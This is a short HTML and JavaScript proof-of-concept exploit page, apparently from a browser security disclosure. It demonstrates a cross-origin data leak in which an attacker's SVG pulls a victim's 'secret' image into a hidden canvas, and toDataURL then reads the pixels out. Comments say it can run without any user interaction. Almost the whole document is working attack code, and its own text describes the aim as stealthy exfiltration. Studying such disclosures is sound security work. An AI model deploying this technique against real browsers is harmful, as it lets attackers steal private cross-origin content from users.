This exploit can be performed completely without user interaction.
The following buttons are just to help you in understanding the exploit
and how it works: To run it press "exploit step 1" button
followed by "exploit step 2"

<input type="button" value="exploit step 1" onclick="go1()">
<input type="button" value="exploit step 2" onclick="go2()">

<!-- Populates the image cache with the "secret" cross-origin image -->
<object data="exploit.svg" type="image/svg+xml"></object>

<!-- Canvas (hidden) to strip the cross-origin image into dataURL later
(can also be hidden using style="display:none" !) -->
<canvas id="canvas" width="700" height="500"/>


<script>
  function importSVG(source, target) {
    var ctx = target.getContext("2d");
    var img = new Image();
    img.src = source;
    img.onload = function() {
      ctx.drawImage(img,0,0);
    }
  }

  // load the attacker's exploit.svg into the Canvas
  // (note the exploit.svg itself references the victim's
  // secret cross-origin image!)
  var canvas;
  function go1() {
    canvas = document.getElementById("canvas");
    importSVG("exploit.svg", canvas);
  }

  // tries to exfiltrate the cross-origin image by converting
  // the canvas into dataURL:
  function go2() {
    var img = canvas.toDataURL("image/png");
    alert("I got the secret image here to exfiltrate stealthy: "+img);
  }
</script>
